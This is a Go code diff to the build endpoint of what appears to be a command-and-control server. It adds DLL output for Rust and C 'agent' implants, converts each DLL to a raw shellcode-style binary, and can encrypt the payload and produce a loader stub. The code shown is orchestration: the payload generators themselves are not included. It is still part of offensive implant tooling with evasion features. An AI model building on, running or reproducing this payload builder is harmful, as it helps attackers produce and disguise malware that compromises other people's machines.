@@ -822,18 +822,49 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "rust build: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		result["exe"] = rustPath
+		if cfg.Format == "dll" {
+			result["dll"] = rustPath
+			if rawPath, err := BuildRAW(rustPath, payloadsDir); err == nil {
+				result["bin"] = rawPath
+				if cfg.Encrypt != "" {
+					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
+						result["enc"] = encPath
+						result["stub"] = stubPath
+					}
+				}
+			}
+		} else {
+			result["exe"] = rustPath
+		}
 		jsonOK(w, result)
 		return
 	}
 
 	if cfg.Lang == "c" {
-		cPath, err := BuildCAgentEXE(cfg, payloadsDir)
-		if err != nil {
-			jsonErr(w, "c build: "+err.Error(), http.StatusInternalServerError)
-			return
+		if cfg.Format == "dll" {
+			dllPath, err := BuildCAgentDLL(cfg, payloadsDir)
+			if err != nil {
+				jsonErr(w, "c dll build: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
+			result["dll"] = dllPath
+			if rawPath, err := BuildRAW(dllPath, payloadsDir); err == nil {
+				result["bin"] = rawPath
+				if cfg.Encrypt != "" {
+					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
+						result["enc"] = encPath
+						result["stub"] = stubPath
+					}
+				}
+			}
+		} else {
+			cPath, err := BuildCAgentEXE(cfg, payloadsDir)
+			if err != nil {
+				jsonErr(w, "c build: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
+			result["exe"] = cPath
 		}
-		result["exe"] = cPath
 		jsonOK(w, result)
 		return
 	}
